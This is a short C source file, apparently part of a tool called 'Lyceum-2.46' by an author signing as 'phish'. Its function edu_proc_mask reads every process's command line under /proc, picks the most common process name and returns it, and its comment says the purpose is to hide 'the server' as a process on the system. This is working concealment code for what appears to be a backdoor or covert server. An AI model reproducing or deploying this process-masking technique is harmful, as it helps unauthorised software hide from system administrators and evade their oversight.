/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <linux/unistd.h>
#include <sys/time.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

unsigned int get_random (u_int, u_int);
int ret_value = 0;
char p_most[1024];

int
search_array (char *string, char array[1024][1024], int maxarray)
{
  extern int ret_value;
  ret_value = 0;

  while (maxarray--)
    {
      if ((strncmp (string, array[maxarray], strlen (array[maxarray]))) == 0)
	ret_value++;
    }
  return ret_value;
}


char *
edu_proc_mask (int argc, char *argv[])
{

  // hide the server as a process on the system

  int pcount = 0;
  int n;
  char buf[1024];
  char pbuf[1024][1024];
  struct dirent **namelist;
  FILE *stream;
  int mask_process = 0;
  int search_results = 0;
  int a;

  if ((n = scandir ("/proc", &namelist, 0, alphasort)) < 0)
    return NULL;

  // Read and store all names of running processes

  while (n--)
    {
      if (atoi (namelist[n]->d_name))
	{
	  snprintf (buf, 1024, "/proc/%s/cmdline", namelist[n]->d_name);

	  if ((stream = fopen (buf, "r")) != NULL)
	    {
	      fgets (pbuf[pcount], 1024, stream);
	      pcount++;
	      fclose (stream);
	    }
	  free (namelist[n]);
	  bzero (buf, 1024);
	}
    }

  a = pcount;
  mask_process = 0;

  // find most common process

  while (a--)
    {
      search_results = search_array (pbuf[a], pbuf, pcount);
      if ((strlen (pbuf[a])) > 0)
	{
	  if (search_results > mask_process)
	    {
	      strncpy (p_most, pbuf[a], 1024);
	      mask_process = search_results;
	    }
	}
    }
  return p_most;	// return process name

}
